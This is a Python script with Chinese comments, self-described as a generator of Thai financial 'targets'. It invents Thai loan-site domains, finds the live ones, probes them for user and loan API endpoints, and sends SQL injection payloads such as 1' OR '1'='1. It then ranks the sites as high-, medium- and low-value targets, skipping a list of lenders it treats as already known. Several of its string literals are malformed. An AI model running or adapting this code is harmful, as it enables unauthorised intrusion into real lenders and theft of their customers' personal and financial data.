#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
泰国金融目标生成器
Thai Financial Target Generator
智能发现新的泰国贷款平台
"""

import requests
import re
import time
import json
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ThaiFinancialTargetGenerator:
    """泰国金融目标生成器"""

    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]

        # 避免已知目标
        self.avoid_targets = [
            'moneycat.co.th', 'mula-x.com', 'rocket-cash.com', 'kloan.co.th',
            'ngerntidlor.com', 'peacoop.or.th', 'ngoenmun.com', 'quickcash.in.th',
            'quickcash.co.th', 'tunecash.co.th', 'cashwagon.co.th', 'digido.co.th',
            'loanexpress.in.th', 'firstloan.co.th', 'creditjet.co.th', 'moneybus.co.th'
        ]

        # 泰国金融关键词
        self.finance_keywords = [
            'loan', 'credit', 'cash', 'money', 'finance', 'fintech', 'express',
            'fast', 'quick', 'easy', 'instant', 'rapid', 'digital', 'online',
            'payday', 'personal', 'consumer', 'micro', 'small', 'mini', 'nano',
            'speedy', 'swift', 'rapid', 'flash', 'turbo', 'express', 'instant'
        ]

        self.discovered_targets = []

    def generate_thai_loan_domains(self):
        """生成泰国贷款域名组合"""
        print("生成泰国金融域名组合...")

        # 泰语相关词汇（拉丁化）
        thai_words = [
            'thanachart', 'kasikorn', 'scb', 'bbl', 'ktb', 'bay', 'cimb',
            'uob', 'hsbc', 'krungsri', 'tmb', 'mea', 'gsb', 'baac'
        ]

        # 金融服务词汇
        finance_words = [
            'loan', 'credit', 'cash', 'money', 'fund', 'finance', 'fintech',
            'capital', 'express', 'fast', 'quick', 'easy', 'instant',
            'digital', 'online', 'mobile', 'payday', 'personal', 'consumer'
        ]

        # 服务词汇
        service_words = [
            'service', 'thai', 'asia', 'plus', 'pro', 'hub', 'center', 'online',
            'digital', 'mobile', 'express', 'fast', 'quick', 'easy', 'instant'
        ]

        # 泰国域名后缀
        thai_domains = ['.co.th', '.in.th', '.net.th', '.org.th', '.go.th']

        potential_domains = []

        # 组合生成域名
        for finance in finance_words[:15]:  # 限制数量
            for service in service_words[:8]:
                for domain in thai_domains:
                    full_domain = f"{finance}{service}{domain}"
                    if not any(avoid in full_domain for avoid in self.avoid_targets):
                        potential_domains.append(full_domain)

        # 添加数字变体
        for i, domain in enumerate(potential_domains[:20]):
            base_domain = domain.split('.')[0]
            for num in ['24', '365', '88', '99', '777', '8888', '99']:
                potential_domains.append(f"{base_domain}{num}{domain.split('.', 1)[1]}")

        return list(set(potential_domains))[:50]  # 去重并限制数量

    def test_domain_quickly(self, domain):
        """快速测试域名"""
        try:
            url = f"https://{domain}"
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'th-TH,th;q=0.9,en;q=0.8'
            }

            response = requests.get(
                url,
                headers=headers,
                timeout=8,
                verify=False,
                allow_redirects=True
            )

            if response.status_code == 200:
                content = response.text.lower()
                finance_score = 0

                # 检查金融关键词
                for keyword in self.finance_keywords:
                    if keyword in content:
                        finance_score += 1

                # 检查贷款特定功能
                loan_features = [
                    'application', 'apply now', 'get loan', 'loan calculator',
                    'emi calculator', 'interest rate', 'monthly payment',
                    'สมัคร', 'กู้เงิน', 'คำนวณ', 'ดอกเบี้ย', 'ผ่อน'
                ]

                for feature in loan_features:
                    if feature in content:
                        finance_score += 2

                if finance_score >= 4:
                    return {
                        'domain': domain,
                        'url': url,
                        'status_code': response.status_code,
                        'finance_score': finance_score,
                        'title': self.extract_title(response.text),
                        'is_finance_site': True,
                        'content_length': len(content),
                        'response_time': response.elapsed.total_seconds()
                    }

        except:
            pass
        return None

    def extract_title(self, html_content):
        """提取网页标题"""
        try:
            title_match = re.search(r'<title[^>]*>([^<]+)</title>', html_content, re.IGNORECASE)
            if title_match:
                return title_match.group(1).strip()
        except:
            pass
        return "Unknown"

    def quick_injection_test(self, url):
        """快速SQL注入测试"""
        test_urls = [
            f"{url}/application.php?id=1",
            f"{url}/apply.php?id=1",
            f"{url}/loan.php?id=1",
            f"{url}/user.php?id=1",
            f"{url}/customer.php?id=1",
            f"{url}/search?q=test"
        ]

        injection_points = []

        for test_url in test_urls:
            try:
                # SQL注入测试
                params = None
                if '?' in test_url:
                    # URL已有参数
                    test_payload = "1' OR '1'='1"
                    param_name = 'id'
                    test_url = test_url.replace('id=1', f'id={test_payload}')
                else:
                    # 添加参数
                    params = {'q': "test'}

                response = requests.get(
                    test_url,
                    params=params,
                    headers={'User-Agent': random.choice(self.user_agents)},
                    timeout=5,
                    verify=False
                )

                if response.elapsed.total_seconds() > 3 or 'sql' in response.text.lower():
                    injection_points.append({
                        'url': test_url,
                        'parameter': 'id' if 'id=' in test_url else 'q',
                        'payload': "1' if 'id=' in test_url else "test",
                        'response_time': response.elapsed.total_seconds()
                    })
                    break

            except:
                continue

        return injection_points

    def discover_api_endpoints(self, url):
        """发现API端点"""
        api_paths = [
            '/api/v1/users', '/api/application', '/api/loan',
            '/api/customer', '/api/member', '/api/account',
            '/wp-json/wp/v2/users', '/wp-json/api/v1/loan',
            '/admin/api/users', '/backend/api/clients',
            '/mobile/api/application', '/rest/api/loan'
        ]

        discovered_apis = []

        for api_path in api_paths:
            api_url = urljoin(url, api_path)
            try:
                response = requests.get(
                    api_url,
                    headers={'User-Agent': random.choice(self.user_agents)},
                    timeout=5,
                    verify=False
                )

                if response.status_code == 200:
                    discovered_apis.append({
                        'endpoint': api_path,
                        'status': response.status_code,
                        'response_length': len(response.text)
                    })
            except:
                continue

        return discovered_apis

    def generate_target_report(self, targets):
        """生成目标报告"""
        print(f"\n=== 泰国金融目标生成报告 ===")
        print(f"生成时间: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"测试目标: {len(targets)}")

        report = {
            'generation_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'total_domains_tested': len(targets),
            'high_value_targets': [],
            'medium_value_targets': [],
            'low_value_targets': [],
            'api_endpoints_discovered': 0,
            'injection_points_found': 0
        }

        for target in targets:
            if target['finance_score'] >= 8:
                category = 'high'
            elif target['finance_score'] >= 5:
                category = 'medium'
            else:
                category = 'low'

            # API端点和注入点数量
            api_count = len(target.get('api_endpoints', []))
            injection_count = len(target.get('injection_points', []))

            report['api_endpoints_discovered'] += api_count
            report['injection_points_found'] += injection_count

            target_data = {
                'domain': target['domain'],
                'url': target['url'],
                'title': target.get('title', 'Unknown'),
                'finance_score': target['finance_score'],
                'content_length': target.get('content_length', 0),
                'response_time': target.get('response_time', 0),
                'api_endpoints': target.get('api_endpoints', []),
                'injection_points': target.get('injection_points', []),
                'total_score': target['finance_score'] + (api_count * 0.5) + (injection_count * 1)
            }

            if category == 'high':
                report['high_value_targets'].append(target_data)
            elif category == 'medium':
                report['medium_value_targets'].append(target_data)
            else:
                report['low_value_targets'].append(target_data)

        # 保存报告
        with open('thai_financial_target_report.json', 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)

        print(f"\n=== 目标分类 ===")
        print(f"🔥 高价值目标: {len(report['high_value_targets'])} 个")
        print(f"🟡 中价值目标: {len(report['medium_value_targets'])} 个")
        print(f"🟢 低价值目标: {len(report['low_value_targets'])} 个")
        print(f"🔌 API端点: {report['api_endpoints_discovered']} 个")
        print(f"⚠️ 潜在注入点: {report['injection_points_found']} 个")

        return report

    def run_target_generation(self):
        """运行目标生成"""
        print("启动泰国金融目标生成器...")

        # 1. 生成域名
        domains = self.generate_thai_loan_domains()
        print(f"生成 {len(domains)} 个潜在金融域名")

        # 2. 快速测试
        print(f"\n快速测试域名可用性...")
        live_targets = []

        with ThreadPoolExecutor(max_workers=12) as executor:
            futures = {executor.submit(self.test_domain_quickly, domain): domain for domain in domains}

            for future in as_completed(futures):
                target = future.result()
                if target and target['is_finance_site']:
                    live_targets.append(target)
                    print(f"发现: {target['domain']} (评分: {target['finance_score']})")

        print(f"\n发现的金融网站: {len(live_targets)} 个")

        # 3. 深度扫描前20个目标
        print(f"\n深度扫描前20个高价值目标...")
        live_targets.sort(key=lambda x: x['finance_score'], reverse=True)

        for i, target in enumerate(live_targets[:20]):
            print(f"\n[{i+1}/20] 深度扫描: {target['domain']}")

            # 发现API端点
            apis = self.discover_api_endpoints(target['url'])
            if apis:
                target['api_endpoints'] = apis
                print(f"  发现API端点: {len(apis)} 个")

            # 测试注入点
            injections = self.quick_injection_test(target['url'])
            if injections:
                target['injection_points'] = injections
                print(f"  发现潜在注入点: {len(injections)} 个")

        # 4. 生成报告
        self.discovered_targets = live_targets
        report = self.generate_target_report(live_targets)

        return report

def main():
    """主函数"""
    generator = ThaiFinancialTargetGenerator()

    try:
        report = generator.run_target_generation()

        print(f"\n=== 发现的高价值目标 ===")
        for i, target in enumerate(report['high_value_targets'][:10], 1):
            print(f"{i}. {target['domain']} (综合评分: {target['total_score']:.1f})")
            print(f"   标题: {target['title']}")
            print(f"   API端点: {len(target['api_endpoints'])}, 潜在注入点: {len(target['injection_points'])}")

        print(f"\n📁 详细报告已保存到: thai_financial_target_report.json")

    except KeyboardInterrupt:
        print("\n目标生成已取消")
    except Exception as e:
        print(f"生成错误: {e}")

if __name__ == "__main__":
    main()